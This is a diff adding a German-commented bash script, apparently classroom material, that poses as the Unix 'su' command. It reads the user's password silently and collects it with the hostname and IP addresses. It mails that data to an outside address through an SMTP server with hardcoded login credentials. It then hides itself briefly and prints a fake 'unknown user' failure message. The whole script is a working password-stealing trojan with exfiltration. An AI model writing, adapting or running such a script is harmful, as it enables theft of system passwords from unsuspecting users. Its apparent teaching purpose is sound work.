@@ -1,0 +1,64 @@
+#!/bin/bash
+# Setup
+INFO_FILE="/tmp/.xyz632jf"
+SU_VISIBLE=$0	# so wurde es aufgerufen, ggf. mit Pfad
+SU_HIDDEN="/tmp/.xyz092ld"
+RENAME_SCRIPT="/tmp/.xyz00gg" # absoluter Pfad
+HIDDEN_TIME="30"
+
+# Step 1: Verhalten nachbilden
+echo -n "Passwort: "	# -n --> kein Zeilenumbruch
+read -s PASSWORD	# -s --> silent
+echo ""			# Zeilenumbruch
+# sleep 3			# 3s warten
+# echo "su: Benutzer bei zu Grunde liegendem Authentifizierungsmodul nicht bekannt"
+
+# Step 2: Informationen sammeln
+echo "Augerufenes Kommando: $0 $1 $2 $3 $4 $5"	>   $INFO_FILE
+echo "Passwort: $PASSWORD"			>>  $INFO_FILE
+echo "Hostname: $HOSTNAME"			>>  $INFO_FILE
+echo "IP Adressen:"				>>  $INFO_FILE
+IP_ADDRESSES=`/sbin/ifconfig | grep inet`
+echo "$IP_ADDRESSES"				>>  $INFO_FILE
+echo ""						>>  $INFO_FILE 
+echo "."                                        >>  $INFO_FILE # Ende Mail ist . auf Zeile
+
+# Step 3: Informationen versenden
+# mail versucht an mailp zu senden --> scheitert
+# mail 	-s "Passwortklau mittels su" \
+#	-r "bill.gates@kleinweich.test" \
+#	studierende@cs15.ba-leipzig.de \
+#	< $INFO_FILE	# Inhalt Datei INFO_FILE versenden
+
+mailx -v \
+	-r "ingolf.brunner@ba-leipzig.de" \
+	-s "Passwortklau mittels su" \
+	-S smtp="mail.ba-leipzig.de:587" \
+	-S smtp-use-starttls \
+	-S smtp-auth=login \
+	-S smtp-auth-user="username" \
+	-S smtp-auth-password="Geheim1234" \
+	-S ssl-verify=ignore \
+	studierende@cs15.ba-leipzig.de \
+	< $INFO_FILE > /dev/null 2>&1   # Inhalt Datei INFO_FILE versenden und Ausgabe umleiten
+
+
+rm $INFO_FILE		# INFO_FILE löschen
+
+# Step 4: Verstecken
+mv $SU_VISIBLE $SU_HIDDEN	# su Script verstecken
+
+# Script für Rückbenennung erzeugen
+echo "#!/bin/bash"			>  $RENAME_SCRIPT
+echo "rm $RENAME_SCRIPT"		>> $RENAME_SCRIPT	# Script löschen (Sekundärspeicher)
+echo "sleep $HIDDEN_TIME"		>> $RENAME_SCRIPT	# gewisse Zeit warten
+echo "mv $SU_HIDDEN $SU_VISIBLE"	>> $RENAME_SCRIPT	# verstecktes su zurück benennen
+echo "exit 0"				>> $RENAME_SCRIPT
+
+chmod 700 $RENAME_SCRIPT	# Script ausführbar machen
+$RENAME_SCRIPT &		# im Hintergrund ausführen
+
+# Step 5: Fehlermeldung und beenden mit Exit-Code 1 (Passwortfehler)
+sleep 3                       # 3s warten 
+echo "su: Benutzer bei zu Grunde liegendem Authentifizierungsmodul nicht bekannt"
+exit 1 # Falsches Passwort --> Fehlerstatus 1
